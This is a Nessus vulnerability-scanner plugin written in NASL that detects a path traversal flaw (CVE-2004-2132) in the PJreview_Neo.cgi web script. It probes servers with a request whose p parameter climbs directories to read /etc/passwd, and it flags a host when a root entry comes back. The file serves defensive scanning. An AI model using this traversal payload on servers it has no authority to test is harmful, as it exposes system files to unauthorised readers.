#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12035);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2004-2132");
 script_bugtraq_id(9524);
 script_osvdb_id(3746);
 
 script_name(english:"PJ CGI Neo PJreview_Neo.cgi p Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be read on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PJreview_neo.cgi - a web-based software.

There is a bug in this software which may allow an attacker to read 
arbitrary files on the remote web server with the privileges of the
web user." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of PJReview or disable this software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/02/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/01/29");
 script_cvs_date("$Date: 2011/08/18 19:20:49 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Checks Aprox Portal");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("webmirror.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 u = strcat(dir,"/PJreview_Neo.cgi?p=../../../../../../../../../../etc/passwd");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);
 buf = strcat(r[0], r[1], '\r\n', r[2]);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_warning(port, extra:
strcat('\nThe following URL exhibits the flaw :\n\n', build_url(port: port, qs: u), '\n'));
	exit(0);
	}
}
